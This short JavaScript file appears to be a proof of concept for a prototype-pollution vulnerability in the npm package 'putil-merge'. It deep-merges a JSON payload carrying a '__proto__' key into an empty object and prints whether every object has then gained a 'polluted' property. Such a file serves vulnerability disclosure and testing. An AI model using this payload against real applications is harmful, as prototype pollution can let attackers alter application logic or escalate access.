var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const putil_merge = require('putil-merge');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
var obj = {};
console.log({}.polluted);
putil_merge(obj, payload, { deep: true });
console.log({}.polluted);